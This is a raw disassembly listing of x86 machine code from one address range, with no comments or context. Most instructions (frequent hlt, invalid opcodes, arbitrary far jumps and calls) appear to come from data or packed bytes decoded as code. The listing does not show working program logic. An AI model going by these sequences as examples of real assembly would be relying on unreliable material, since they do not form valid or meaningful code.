  40b129:	and    edx,esi
  40b12b:	pop    ds
  40b12c:	mov    edx,0xe90ef921
  40b131:	add    esi,esp
  40b133:	add    al,0xfe
  40b135:	add    edx,DWORD PTR [edi-0x29fc36fc]
  40b13b:	add    al,0xc4
  40b13d:	add    eax,DWORD PTR [edi-0xbfc34fc]
  40b143:	add    al,0xaa
  40b145:	add    ecx,DWORD PTR [ebx+0x47039404]
  40b14b:	add    eax,0x5510379
  40b150:	add    BYTE PTR [edx-0x16fffb09],cl
  40b156:	test   DWORD PTR [eax+eax*1],0x4f7e9
  40b15d:	jmp    0xe940b659
  40b162:	test   DWORD PTR ds:0x34fe1900,0x42da9e00
  40b16c:	add    BYTE PTR [edx-0x1c],dh
  40b16f:	inc    edx
  40b170:	add    BYTE PTR [ecx],al
  40b172:	rol    BYTE PTR [edx+0x0],cl
  40b175:	adc    cl,dl
  40b177:	inc    edx
  40b178:	add    BYTE PTR [ebx-0x54ffbd1f],dl
  40b17e:	ret    
  40b17f:	inc    edx
  40b180:	add    BYTE PTR [ebp-0x43],al
  40b183:	inc    edx
  40b184:	add    BYTE PTR [ecx],ah
  40b186:	mov    edi,0x910042
	...
  40b1a3:	cs inc ebx
  40b1a5:	add    BYTE PTR [ebp-0x9ffbcd5],bh
  40b1ab:	and    eax,DWORD PTR [ebx+0x0]
  40b1ae:	sbb    DWORD PTR [esi],0xe640043
  40b1b4:	inc    ebx
  40b1b5:	add    BYTE PTR [ebx-0x7effbd58],cl
  40b1bb:	mov    ah,0x42
  40b1bd:	add    BYTE PTR [edx-0x75ffbd4c],cl
  40b1c3:	mov    ah,0x42
  40b1c5:	add    BYTE PTR [edx-0x7effbd4c],cl
  40b1cb:	mov    ah,0x42
  40b1cd:	add    BYTE PTR [edx+0x510042b4],cl
  40b1d3:	mov    ah,0x42
  40b1d5:	add    BYTE PTR [esi-0x4c],ah
  40b1d8:	inc    edx
  40b1d9:	add    BYTE PTR [ecx-0x28],bh
  40b1dc:	add    al,0x0
  40b1de:	mov    esp,0x6ef7
  40b1e3:	fld    QWORD PTR [ebx]
  40b1e5:	add    BYTE PTR [eax],al
  40b1e7:	and    cl,BYTE PTR [edi+0x42]
  40b1ea:	add    BYTE PTR [ebx+0x7900425b],dl
  40b1f0:	pop    ebx
  40b1f1:	inc    edx
  40b1f2:	add    dh,al
  40b1f4:	pop    edx
  40b1f5:	inc    edx
  40b1f6:	add    BYTE PTR ds:0x3800425c,bl
  40b1fc:	pop    esp
  40b1fd:	inc    edx
  40b1fe:	add    BYTE PTR [edx+0x5b],ch
  40b201:	inc    edx
  40b202:	add    BYTE PTR [esi],dl
  40b204:	push   edx
  40b205:	inc    edx
	...
  40b21e:	add    BYTE PTR [eax],al
  40b220:	sahf   
  40b221:	push   eax
  40b222:	inc    edx
  40b223:	add    dh,ah
  40b225:	push   ecx
  40b226:	inc    edx
  40b227:	add    BYTE PTR [ebp+0x5f],cl
  40b22a:	inc    edx
  40b22b:	add    BYTE PTR [eax+0x2800425d],bl
  40b231:	pop    ebx
  40b232:	inc    edx
  40b233:	add    BYTE PTR [ebx+0x5a],ah
  40b236:	inc    edx
  40b237:	add    al,bl
  40b239:	pop    ebp
  40b23a:	inc    edx
  40b23b:	add    BYTE PTR [ecx+0x57],ah
  40b23e:	inc    edx
  40b23f:	add    BYTE PTR [edx-0x55ffffb1],ch
  40b245:	push   edi
  40b246:	inc    ebx
  40b247:	add    BYTE PTR [edx+0x3e00004a],cl
  40b24d:	add    esp,DWORD PTR [ecx+0x0]
  40b250:	aas    
  40b251:	add    ebp,DWORD PTR [ecx+0x0]
  40b254:	cmp    eax,DWORD PTR [ebx]
  40b256:	add    BYTE PTR gs:[ecx],ah
  40b259:	add    ebp,DWORD PTR [esi]
  40b25b:	add    BYTE PTR [ecx+0x3],al
  40b25e:	ins    BYTE PTR es:[edi],dx
  40b25f:	add    BYTE PTR [ecx],bh
  40b261:	add    eax,DWORD PTR [eax]
  40b263:	add    BYTE PTR [ebx+0x44],dl
  40b266:	dec    ecx
  40b267:	inc    ebx
  40b268:	pop    edi
  40b269:	pop    esi
  40b26a:	popa   
  40b26b:	je     0x40b1ed
  40b26d:	add    eax,DWORD PTR [eax]
  40b26f:	add    BYTE PTR [ebx+0x44],dl
  40b272:	dec    ecx
  40b273:	inc    ecx
  40b274:	hlt    
  40b275:	mov    DWORD PTR [esi+0x46],esp
  40b278:	lea    edi,[ecx+0x66]
  40b27b:	add    ah,dh
  40b27d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b27e:	aas    
  40b27f:	dec    ecx
  40b280:	xor    cl,BYTE PTR [eax+0x7375]
	...
  40b29a:	add    BYTE PTR [eax],al
  40b29c:	add    BYTE PTR [ebx+ebp*4+0x61],cl
  40b2a0:	bound  ecx,QWORD PTR [ebp+0x76]
  40b2a3:	data16 je 0x40b29a
  40b2a6:	and    eax,0x41304941
  40b2ab:	jno    0x40b321
  40b2ad:	inc    esi
  40b2ae:	aas    
  40b2af:	jnp    0x40b2b1
  40b2b1:	hlt    
  40b2b2:	jb     0x40b308
  40b2b4:	inc    edx
  40b2b5:	hlt    
  40b2b6:	cmp    BYTE PTR [edi+0x673bf440],0x42
  40b2bd:	hlt    
  40b2be:	stos   DWORD PTR es:[edi],eax
  40b2bf:	gs inc edx
  40b2c1:	hlt    
  40b2c2:	cmc    
  40b2c3:	add    ah,BYTE PTR [esp+esi*8+0xc]
  40b2c7:	add    al,0x74
  40b2c9:	hlt    
  40b2ca:	jmp    0x40b2ce
  40b2cc:	add    ah,dh
  40b2ce:	cmp    al,BYTE PTR [eiz*2+0x68043af4]
  40b2d5:	hlt    
  40b2d6:	clc    
  40b2d7:	add    dh,BYTE PTR [esp+esi*8-0x1]
  40b2db:	add    ebp,DWORD PTR [edi-0xc]
  40b2de:	test   BYTE PTR [edx],0x6e
  40b2e1:	hlt    
  40b2e2:	sbb    eax,DWORD PTR [edx+esi*2]
  40b2e5:	hlt    
  40b2e6:	aam    0x2
  40b2e8:	jbe    0x40b2de
  40b2ea:	aam    0x2
  40b2ec:	ins    BYTE PTR es:[edi],dx
  40b2ed:	hlt    
  40b2ee:	enter  0x6702,0xf4
  40b2f2:	rol    BYTE PTR [edx],0x0
  40b2f5:	hlt    
  40b2f6:	push   ss
  40b2f7:	test   DWORD PTR [ecx-0xc],eax
  40b2fa:	dec    esp
  40b2fb:	pop    es
  40b2fc:	dec    ebx
  40b2fd:	jno    0x40b2fc
  40b2ff:	(bad)  
	...
  40b319:	add    BYTE PTR ds:0x53ffbb6d,al
  40b31f:	add    eax,0xb0addbb6
  40b324:	addr16 push edi
  40b326:	mov    edx,0x24106cf7
  40b32b:	adc    al,0x42
  40b32d:	mov    esi,0xdc5615f3
  40b332:	les    ecx,FWORD PTR [edx]
  40b334:	sbb    al,0x3f
  40b336:	jns    0x40b32f
  40b338:	outs   dx,BYTE PTR ds:[esi]
  40b339:	jl     0x40b2ff
  40b33b:	adc    ebp,DWORD PTR [ebx+0x51]
  40b33e:	hlt    
  40b33f:	les    esi,FWORD PTR ds:0x37b12ddc
  40b345:	xchg   DWORD PTR [ebx],ebp
  40b347:	shr    BYTE PTR [esi+0x7b],0xa4
  40b34b:	adc    ebp,DWORD PTR [ebx+0x56]
  40b34e:	hlt    
  40b34f:	les    esi,FWORD PTR ds:0x93b14ddc
  40b355:	cmp    BYTE PTR [ecx-0x9],bh
  40b358:	outs   dx,BYTE PTR ds:[esi]
  40b359:	jnp    0x40b31f
  40b35b:	adc    ebp,DWORD PTR [ebx+0x56]
  40b35e:	hlt    
  40b35f:	les    esi,FWORD PTR ds:0x4fb12ddc
  40b365:	xchg   esi,eax
  40b366:	out    dx,eax
  40b367:	fst    QWORD PTR [ebx+0x6313a54f]
  40b36d:	xchg   ecx,eax
  40b36e:	jae    0x40b325
  40b370:	xor    eax,0x52f1c4bd
  40b375:	xchg   esi,eax
  40b376:	out    dx,eax
  40b377:	fnsave [ebx+0x4f]
  40b37a:	inc    ebp
  40b37b:	adc    esp,DWORD PTR [ebx-0x6f]
	...
  40b396:	add    BYTE PTR [ebx-0x4b],dl
  40b399:	mov    ch,0xbc
  40b39b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b39c:	icebp  
  40b39d:	repnz add esi,esp
  40b3a0:	add    al,0x72
  40b3a2:	push   ebx
  40b3a3:	mov    dh,0x4
  40b3a5:	mov    edi,es
  40b3a7:	mov    ah,0x4
  40b3a9:	mov    ebp,0x2904b595
  40b3ae:	popa   
  40b3af:	mov    dh,0x4
  40b3b1:	add    BYTE PTR [esi-0x16dfaf4c],ch
  40b3b7:	test   DWORD PTR [eax+eax*1],0x5451beb9
  40b3be:	leave  
  40b3bf:	test   DWORD PTR [eax+eax*1],0x434b36
  40b3c6:	leave  
  40b3c7:	test   DWORD PTR [eax+eax*1],0x469f58
  40b3ce:	xor    BYTE PTR [edi-0x70d9ffba],cl
  40b3d4:	inc    esi
  40b3d5:	add    BYTE PTR [ecx],dh
  40b3d7:	mov    DWORD PTR [esi+0x0],eax
  40b3da:	pop    ebx
  40b3db:	sahf   
  40b3dc:	inc    esi
  40b3dd:	add    BYTE PTR [ebp+0x5d],cl
  40b3e0:	xor    al,0x0
  40b3e2:	in     al,0xf7
  40b3e4:	add    al,0x0
  40b3e6:	imul   eax,DWORD PTR gs:[esi+0x0],0x466246
  40b3ee:	addr16 fs inc esi
  40b3f1:	add    cl,al
  40b3f3:	popa   
  40b3f4:	inc    esi
  40b3f5:	add    bl,dl
  40b3f7:	arpl   WORD PTR [esi+0x0],ax
  40b3fa:	dec    edx
	...
  40b413:	add    ah,cl
  40b415:	inc    esi
  40b416:	add    BYTE PTR [edx+0x44],al
  40b419:	inc    esi
  40b41a:	add    BYTE PTR [ebx-0x37ffb9b5],ch
  40b420:	mov    ds:0x2c4a0046,eax
  40b425:	inc    edi
  40b426:	add    BYTE PTR [ecx+0x1c],dl
  40b429:	inc    edi
  40b42a:	add    al,dh
  40b42c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b42d:	inc    esi
  40b42e:	add    BYTE PTR ds:0xba003df8,ah
  40b434:	not    DWORD PTR [eax+eax*1-0x53]
  40b438:	test   DWORD PTR [ebp+0x0],0x4f7b0
  40b43f:	mov    dh,0xf7
  40b441:	push   ebp
  40b442:	add    BYTE PTR [eax],al
  40b444:	popa   
  40b445:	or     BYTE PTR [eax],al
  40b447:	add    bl,bh
  40b449:	mov    al,0x40
  40b44b:	add    BYTE PTR [ebp+0x5a],bh
  40b44e:	pop    edi
  40b44f:	dec    edi
  40b450:	dec    ebp
  40b451:	outs   dx,BYTE PTR gs:[esi]
  40b453:	push   esp
  40b454:	pop    esi
  40b455:	pop    eax
  40b456:	push   ebx
  40b457:	outs   dx,DWORD PTR ds:[esi]
  40b458:	outs   dx,BYTE PTR ds:[esi]
  40b459:	arpl   WORD PTR [ebp+0x74],sp
  40b45c:	or     eax,0xad000008
  40b461:	pop    ecx
  40b462:	pop    edi
  40b463:	inc    ebx
  40b464:	sbb    DWORD PTR [esi+0x73],0x7cd65
  40b46b:	add    BYTE PTR [ebp+0x59],bh
  40b46e:	pop    edi
  40b46f:	push   eax
  40b470:	push   edx
  40b471:	ins    BYTE PTR es:[edi],dx
  40b472:	ins    BYTE PTR es:[edi],dx
  40b473:	add    BYTE PTR ds:0x525f5b,cl
	...
  40b491:	cmp    BYTE PTR [eax+0x64],ch
  40b494:	add    ch,bh
  40b496:	pop    edx
  40b497:	pop    edi
  40b498:	push   edi
  40b499:	dec    edi
  40b49a:	pusha  
  40b49b:	je     0x40b502
  40b49d:	popf   
  40b49e:	pop    es
  40b49f:	add    BYTE PTR [eax],al
  40b4a1:	ficom  DWORD PTR [ebx+0x74]
  40b4a4:	push   eax
  40b4a5:	fistp  WORD PTR [ebp+0x64]
  40b4a8:	jne    0x40b4e8
  40b4aa:	jne    0x40b4f5
  40b4ac:	outs   dx,BYTE PTR ds:[esi]
  40b4ad:	sti    
  40b4ae:	pop    ebp
  40b4af:	add    BYTE PTR [eax],al
  40b4b1:	in     eax,0x74
  40b4b3:	je     0x40b525
  40b4b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4b6:	sbb    al,0x2f
  40b4b8:	ja     0x40b4c4
  40b4ba:	jbe    0x40b4ea
  40b4bc:	bound  eax,QWORD PTR [edi+ebx*2]
  40b4bf:	addr16 cs out dx,al
  40b4c2:	pop    ebp
  40b4c3:	ins    DWORD PTR es:[edi],dx
  40b4c4:	das    
  40b4c5:	dec    ebp
  40b4c6:	pop    es
  40b4c7:	add    BYTE PTR [eax],al
  40b4c9:	cmc    
  40b4ca:	je     0x40b540
  40b4cc:	jo     0x40b4e5
  40b4ce:	push   ds
  40b4cf:	das    
  40b4d0:	ja     0x40b4fc
  40b4d2:	je     0x40b502
  40b4d4:	addr16 hlt 
  40b4d6:	retf   0x6767
  40b4d9:	mov    al,ds:0x9b6328c8
  40b4de:	fsub   DWORD PTR [edi]
  40b4e0:	add    ah,dh
  40b4e2:	cdq    
  40b4e3:	test   DWORD PTR [edi],edi
  40b4e5:	hlt    
  40b4e6:	stc    
  40b4e7:	test   DWORD PTR [edi],edi
  40b4e9:	hlt    
  40b4ea:	mov    es,WORD PTR [edx]
  40b4ec:	jns    0x40b4e2
  40b4ee:	mov    es,WORD PTR [edx]
  40b4f0:	dec    esp
  40b4f1:	hlt    
  40b4f2:	xchg   esp,eax
  40b4f3:	add    dh,BYTE PTR [ebx+0x0]
	...
  40b50e:	hlt    
  40b50f:	xchg   ecx,eax
  40b510:	add    dl,BYTE PTR [esi-0xc]
  40b513:	test   BYTE PTR [edx],al
  40b515:	gs hlt 
  40b517:	jb     0x40b51c
  40b519:	xor    esi,esp
  40b51b:	lods   eax,DWORD PTR ds:[esi]
  40b51c:	add    al,BYTE PTR [eax]
  40b51e:	hlt    
  40b51f:	test   al,0x2
  40b521:	inc    esp
  40b522:	hlt    
  40b523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b524:	add    al,BYTE PTR [ebx-0xc]
  40b527:	push   edi
  40b528:	add    al,0x69
  40b52a:	hlt    
  40b52b:	dec    eax
  40b52c:	add    al,0x6e
  40b52e:	hlt    
  40b52f:	dec    edi
  40b530:	add    al,0x0
  40b532:	hlt    
  40b533:	push   ds
  40b534:	add    al,0x69
  40b536:	hlt    
  40b537:	ds add al,0x65
  40b53a:	hlt    
  40b53b:	sub    eax,0x10f46f04
  40b540:	add    al,0x49
  40b542:	hlt    
  40b543:	sbb    al,BYTE PTR [esi+ebp*2]
  40b546:	hlt    
  40b547:	inc    DWORD PTR [ebx]
  40b549:	inc    esi
  40b54a:	hlt    
  40b54b:	or     eax,0x8f46104
  40b550:	add    al,0x65
  40b552:	hlt    
  40b553:	fild   DWORD PTR [edx]
  40b555:	add    ah,dh
  40b557:	push   ds
  40b558:	add    al,0x6f
  40b55a:	hlt    
  40b55b:	add    DWORD PTR [ebx+esi*2],eax
  40b55e:	hlt    
  40b55f:	or     al,BYTE PTR [esp+ebp*2]
  40b562:	hlt    
  40b563:	or     BYTE PTR [edi+edx*2],al
  40b566:	hlt    
  40b567:	add    al,0xd0
  40b569:	add    edx,edx
  40b56b:	add    al,0xc5
  40b56d:	add    ecx,ebx
  40b56f:	add    al,0xde
  40b571:	add    eax,DWORD PTR [eax]
	...
  40b58b:	mov    bh,0x4
  40b58d:	mov    ebp,0xba049503
  40b592:	add    esp,DWORD PTR [edi-0xbfc16fc]
  40b598:	add    al,0xa
  40b59a:	add    al,0xc7
  40b59c:	add    al,0xfb
  40b59e:	add    eax,ebx
  40b5a0:	add    al,0xdf
  40b5a2:	add    edi,DWORD PTR [esp+eax*1+0x4f403e9]
  40b5a9:	mov    edx,0x9a056d03
  40b5ae:	add    eax,DWORD PTR [edi+0x5]
  40b5b1:	xchg   ecx,eax
  40b5b2:	add    edx,DWORD PTR [ebp+0x5]
  40b5b5:	test   DWORD PTR [ebx],eax
  40b5b7:	dec    ebx
  40b5b8:	add    eax,0x4f4037e
  40b5bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5be:	dec    edx
  40b5bf:	sub    al,0x40
  40b5c1:	sub    al,0x4
  40b5c3:	hlt    
  40b5c4:	add    al,0x13
  40b5c6:	daa    
  40b5c7:	push   cs
  40b5c8:	add    eax,0x68176328
  40b5cd:	pop    ecx
  40b5ce:	jo     0x40b5a9
  40b5d0:	inc    eax
  40b5d1:	dec    eax
  40b5d2:	sbb    di,WORD PTR [eax+0x48]
  40b5d6:	pop    edi
  40b5d7:	adc    DWORD PTR [edi],ebp
  40b5d9:	or     DWORD PTR [esp+esi*8],eax
  40b5dc:	add    al,0x2a
  40b5de:	sbb    ah,BYTE PTR [bp+di+0xc]
  40b5e2:	arpl   WORD PTR [eax],cx
  40b5e4:	pop    esp
  40b5e5:	push   cs
  40b5e6:	mov    si,0x2a24
  40b5ea:	push   0x90475e3
	...
  40b607:	add    dh,bh
  40b609:	add    al,0xfc
  40b60b:	jno    0x40b5dd
  40b60d:	pop    edi
  40b60e:	push   cs
  40b60f:	data16 or ch,BYTE PTR [ecx+0x0]
  40b613:	add    eax,0x1e0004dc
  40b618:	(bad)  
  40b619:	js     0x40b67c
  40b61b:	rcr    cl,1
  40b61d:	push   edi
  40b61e:	jae    0x40b5e4
  40b620:	lds    eax,FWORD PTR [ebx+0x67]
  40b623:	int3   
  40b624:	cdq    
  40b625:	js     0x40b67a
  40b627:	aad    0xa5
  40b629:	pop    ebx
  40b62a:	outs   dx,BYTE PTR ds:[esi]
  40b62b:	into   
  40b62c:	test   DWORD PTR [eax+eax*1],0x43382f
  40b633:	mov    DWORD PTR [edi],ebp
  40b635:	inc    ebx
  40b636:	add    BYTE PTR [eax+esi*8],al
  40b639:	jne    0x40b63b
  40b63b:	int3   
  40b63c:	div    DWORD PTR [eax+eax*1]
  40b63f:	loope  0x40b638
  40b641:	ins    BYTE PTR es:[edi],dx
  40b642:	add    bh,al
  40b644:	imul   DWORD PTR [ecx]
  40b646:	add    BYTE PTR [edx-0x33fffb09],bl
  40b64c:	div    DWORD PTR [ebx+0x0]
  40b64f:	(bad)  
  40b650:	div    DWORD PTR [eax+eax*1]
  40b653:	mov    cl,0xf7
  40b655:	ins    BYTE PTR es:[edi],dx
  40b656:	add    cl,ch
  40b658:	test   DWORD PTR [eax+eax*1],0x5079552e
  40b65f:	pop    ebx
  40b660:	push   ebx
  40b661:	fs inc ecx
  40b663:	dec    ebp
  40b664:	adc    al,0x73
  40b666:	gs pop edx
  40b668:	daa    
  40b669:	add    eax,0x3500
	...
  40b682:	add    BYTE PTR [eax],al
  40b684:	add    BYTE PTR [ebx],bl
  40b686:	fs sub ax,0x6309
  40b68b:	jb     0x40b6d5
  40b68d:	push   es
  40b68e:	outs   dx,BYTE PTR ds:[esi]
  40b68f:	inc    ecx
  40b690:	jmp    0x3740bb8c
  40b695:	add    al,0x44
  40b697:	jb     0x40b69d
  40b699:	adc    DWORD PTR [ecx+0x65],edi
  40b69c:	cmp    eax,0x86572e0
  40b6a1:	aam    0x4
  40b6a3:	add    BYTE PTR [eax],al
  40b6a5:	sub    esi,DWORD PTR [ebp+0x43]
  40b6a8:	jb     0x40b69a
  40b6aa:	imul   esi,DWORD PTR [ebp+eiz*2-0x10],0xed726573
  40b6b2:	jb     0x40b723
  40b6b4:	arpl   WORD PTR [eax],si
  40b6b6:	jae    0x40b72b
  40b6b8:	add    BYTE PTR [ebx+0x40755160],cl
  40b6be:	jbe    0x40b739
  40b6c0:	dec    ecx
  40b6c1:	imul   edx,DWORD PTR [edx+0x6f],0x72
  40b6c5:	dec    eax
  40b6c6:	imul   esi,DWORD PTR [ecx+ebp*2+0x2a],0x3a72506a
  40b6ce:	arpl   WORD PTR [ebp+0x73],sp
  40b6d1:	dec    esi
  40b6d2:	add    al,0x0
  40b6d4:	add    BYTE PTR [edi],bh
  40b6d6:	pusha  
  40b6d7:	ins    BYTE PTR es:[edi],dx
  40b6d8:	push   ebp
  40b6d9:	pop    esi
  40b6da:	gs jb  0x40b731
  40b6dd:	jne    0x40b754
  40b6df:	gs popa 
  40b6e1:	jno    0x40b735
  40b6e3:	je     0x40b746
  40b6e5:	pop    edi
  40b6e6:	pusha  
	...
  40b6ff:	add    BYTE PTR [eax],al
  40b701:	add    BYTE PTR [ecx+0x7a4c724f],cl
  40b707:	push   0x68494464
  40b70c:	add    BYTE PTR [eax],al
  40b70e:	or     DWORD PTR [ebp+0x72],esp
  40b711:	inc    edi
  40b712:	xor    BYTE PTR [ebp+0x44],dh
  40b715:	ins    BYTE PTR es:[edi],dx
  40b716:	cmp    DWORD PTR [ecx+0x61],eax
  40b719:	outs   dx,BYTE PTR ds:[esi]
  40b71a:	xor    DWORD PTR [ebp+0x65],ebx
  40b71d:	add    dh,bh
  40b71f:	or     BYTE PTR [edi+0x0],cl
  40b722:	ror    DWORD PTR [eax],cl
  40b724:	push   esp
  40b725:	add    dl,dh
  40b727:	or     BYTE PTR [ecx+0x0],al
  40b72a:	out    dx,eax
  40b72b:	or     BYTE PTR [ebp+0x0],al
  40b72e:	cmp    DWORD PTR [ecx],ecx
  40b730:	dec    ebp
  40b731:	add    ah,ah
  40b733:	or     BYTE PTR [ebx+0x0],ah
  40b736:	hlt    
  40b737:	or     eax,DWORD PTR [edi+ebp*2]
  40b73a:	hlt    
  40b73b:	or     al,BYTE PTR [edi+ebp*2]
  40b73e:	hlt    
  40b73f:	inc    DWORD PTR [ebx]
  40b741:	je     0x40b737
  40b743:	adc    DWORD PTR [edi+edx*2],eax
  40b746:	hlt    
  40b747:	add    al,0x4
  40b749:	outs   dx,BYTE PTR ds:[esi]
  40b74a:	hlt    
  40b74b:	or     DWORD PTR [edi+ebp*2],eax
  40b74e:	hlt    
  40b74f:	into   
  40b750:	add    dh,BYTE PTR [ebx-0xc]
  40b753:	std    
  40b754:	add    ecx,DWORD PTR [esi-0xc]
  40b757:	mov    cl,0x2
  40b759:	pop    esp
  40b75a:	hlt    
  40b75b:	call   0x7202:0xabf47502
  40b762:	hlt    
  40b763:	enter  0x6e02,0x0
	...
  40b77f:	hlt    
  40b780:	mov    cl,0x2
  40b782:	push   esi
  40b783:	hlt    
  40b784:	enter  0x7202,0xf4
  40b788:	mov    al,BYTE PTR [edx]
  40b78a:	imul   esi,esp,0xf46e027e
  40b790:	mov    bh,0x2
  40b792:	push   eax
  40b793:	hlt    
  40b794:	mov    DWORD PTR [edx],eax
  40b796:	outs   dx,DWORD PTR ds:[esi]
  40b797:	hlt    
  40b798:	jge    0x40b79c
  40b79a:	imul   esi,esp,0xf465027f
  40b7a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7a1:	add    ch,BYTE PTR [ecx-0xc]
  40b7a4:	push   0x3
  40b7a6:	je     0x40b79c
  40b7a8:	inc    edi
  40b7a9:	add    al,0x25
  40b7ab:	hlt    
  40b7ac:	dec    edx
  40b7ad:	add    al,0x0
  40b7af:	hlt    
  40b7b0:	sub    eax,DWORD PTR [edx+esi*2]
  40b7b3:	hlt    
  40b7b4:	cs add al,0x66
  40b7b7:	hlt    
  40b7b8:	push   esp
  40b7b9:	add    al,0x6c
  40b7bb:	hlt    
  40b7bc:	dec    eax
  40b7bd:	add    al,0x49
  40b7bf:	hlt    
  40b7c0:	dec    eax
  40b7c1:	add    al,0x61
  40b7c3:	hlt    
  40b7c4:	inc    esi
  40b7c5:	add    al,0x65
  40b7c7:	hlt    
  40b7c8:	add    al,0x39
  40b7ca:	add    al,0x15
  40b7cc:	add    eax,0x4dc0415
  40b7d1:	jmp    0xe945abd9
  40b7d6:	outs   dx,DWORD PTR ds:[esi]
  40b7d7:	sub    cl,BYTE PTR [eax+ebp*8]
  40b7da:	outs   dx,DWORD PTR ds:[esi]
  40b7db:	and    cl,BYTE PTR [edx+ebx*8]
  40b7de:	rol    DWORD PTR [ebx+0x6d],0xdd
  40b7e2:	rol    DWORD PTR [eax],0x0
	...
  40b7f9:	add    BYTE PTR [eax],al
  40b7fb:	add    BYTE PTR [ebx],bh
  40b7fd:	ins    DWORD PTR es:[edi],dx
  40b7fe:	(bad)  [eax]
  40b800:	(bad)  
  40b801:	mov    ds:0x4d703ca,al
  40b806:	jmp    0xbc45ac0e
  40b80b:	mov    BYTE PTR [edi],bl
  40b80d:	cmp    BYTE PTR [edi+ebx*1],0x77
  40b811:	push   0x79c70345
  40b816:	fwait
  40b817:	pop    es
  40b818:	stos   BYTE PTR es:[edi],al
  40b819:	jg     0x40b7c4
  40b81b:	dec    ebx
  40b81c:	sti    
  40b81d:	mov    ch,0xf8
  40b81f:	dec    esp
  40b820:	or     ecx,edi
  40b822:	add    esi,ebp
  40b824:	lea    eax,[ebx]
  40b826:	retf   0x5df3
  40b829:	pop    ss
  40b82a:	fs ds enter 0x6054,0x6e
  40b830:	call   0xf5bb4e11
  40b835:	add    al,0x72
  40b837:	enter  0x22db,0xfe
  40b83b:	add    esp,esi
  40b83d:	pushw  0xfffb
  40b840:	sti    
  40b841:	jb     0x40b83e
  40b843:	jle    0x40b87b
  40b845:	adc    eax,0x828c464
  40b84a:	or     BYTE PTR [ecx-0x58],cl
  40b84d:	(bad)  
  40b84f:	xchg   BYTE PTR [ebx+0x20],ah
  40b852:	jo     0x40b89d
  40b854:	cwde   
  40b855:	jns    0x40b892
  40b857:	cld    
  40b858:	add    BYTE PTR [ebp+0x0],0xf9
  40b85c:	daa    
  40b85d:	out    dx,al
  40b85e:	adc    al,0xd1
	...
  40b878:	add    cl,ch
  40b87a:	inc    esp
  40b87b:	add    BYTE PTR [edx+0x2f],dh
  40b87e:	adc    eax,0x7a582489
  40b883:	inc    esi
  40b884:	leave  
  40b885:	call   0xaf9d94d2
  40b88a:	xor    al,0x50
  40b88c:	xchg   ch,bh
  40b88e:	adc    BYTE PTR [edx],dl
  40b890:	sub    eax,edi
  40b892:	std    
  40b893:	mov    dh,0xef
  40b895:	(bad)  
  40b897:	je     0x40b86e
  40b899:	jp     0x40b880
  40b89b:	adc    al,0xdd
  40b89d:	repz xor eax,eax
  40b8a0:	push   edx
  40b8a1:	or     al,0x7a
  40b8a3:	push   es
  40b8a4:	iret   
  40b8a5:	stos   BYTE PTR es:[edi],al
  40b8a6:	ins    DWORD PTR es:[edi],dx
  40b8a7:	push   ds
  40b8a8:	call   0xf12bbda4
  40b8ad:	call   0x109:0x78726606
  40b8b4:	jmp    0xa4ca1fb0
  40b8b9:	sbb    edi,DWORD PTR [edx+0x42]
  40b8bc:	stc    
  40b8bd:	(bad)  
  40b8be:	aam    0x8c
  40b8c0:	mov    dl,0xd
  40b8c2:	adc    al,al
  40b8c4:	retf   0x7db0
  40b8c7:	dec    esp
  40b8c8:	adc    DWORD PTR [edx+0x13],eax
  40b8cb:	lea    esi,[ebx+ebp*4-0x3d67cab]
  40b8d2:	push   esp
  40b8d3:	push   0xffffffe8
  40b8d5:	dec    edx
  40b8d6:	mov    edx,0x702fde7
  40b8db:	add    BYTE PTR [edx+0x0],dh
	...
  40b8f6:	mov    DWORD PTR [ecx+0x36fc54f5],0x8031c2c0
  40b900:	ds (bad) 
  40b902:	(bad)
  40b905:	add    dl,ah
  40b907:	add    DWORD PTR [eax],eax
  40b909:	mov    dl,BYTE PTR [ebp-0x30]
  40b90c:	fld    DWORD PTR [ecx]
  40b90e:	pushf  
  40b90f:	or     BYTE PTR [ebx-0x4182aebb],cl
  40b915:	je     0x40b8bb
  40b917:	out    dx,al
  40b918:	inc    BYTE PTR [eax]
  40b91a:	or     DWORD PTR ds:0x6b51458b,ebx
  40b920:	aas    
  40b921:	adc    BYTE PTR [edx+0x2ec019c0],cl
  40b927:	cmp    eax,0x9d83f8
  40b92c:	push   eax
  40b92d:	dec    DWORD PTR [eax-0xc]
  40b930:	mov    DWORD PTR [ebp+0x55],eax
  40b933:	imul   edi,edi,0xfffffffe
  40b936:	pop    ebp
  40b937:	jo     0x40b939
  40b939:	add    BYTE PTR ds:0x1d98b6d0,bl
  40b93f:	or     BYTE PTR [edx+0x5b5652c3],cl
  40b945:	leave  
  40b946:	iret   
  40b947:	out    dx,eax
  40b948:	(bad)  
  40b949:	push   esp
  40b94a:	xchg   bl,cl
  40b94c:	jg     0x40b93a
  40b94e:	dec    ebp
  40b94f:	std    
  40b950:	(bad)  
  40b951:	call   FWORD PTR [esi+0x4e]
  40b954:	mov    ebx,eax
  40b956:	cmp    ch,BYTE PTR [ebx-0x36]
  40b959:	call   0x40b95e
	...
  40b972:	add    al,cl
  40b974:	in     eax,dx
  40b975:	(bad)  
  40b976:	(bad)  
  40b977:	jnp    0x40b8fb
  40b979:	test   BYTE PTR ds:0xbc81c2,0xcd
  40b980:	pop    es
  40b981:	push   0x7d863
  40b986:	lea    ebx,[eax-0x6f]
  40b989:	clc    
  40b98a:	call   edx
  40b98c:	dec    eax
  40b98d:	add    BYTE PTR [eax-0x75],dl
  40b990:	or     DWORD PTR [esi-0x10a2d06],0xffffffe7
  40b997:	hlt    
  40b998:	mov    ds:0x66f401d1,eax
  40b99d:	inc    ebp
  40b99e:	adc    BYTE PTR [edi-0x67],dh
  40b9a1:	inc    DWORD PTR [esp+esi*4-0x4b7cfacf]
  40b9a8:	add    DWORD PTR [ecx],eax
  40b9aa:	mov    bh,0x2c
  40b9ac:	fbstp  TBYTE PTR [eax+0x2ddf15f]
  40b9b2:	mov    ecx,ebp
  40b9b4:	mov    DWORD PTR [ecx+0x3b],ebp
  40b9b7:	cmp    ah,dl
  40b9b9:	xchg   DWORD PTR [ecx+0x6602ddf4],eax
  40b9bf:	jno    0x40b975
  40b9c1:	ja     0x40ba40
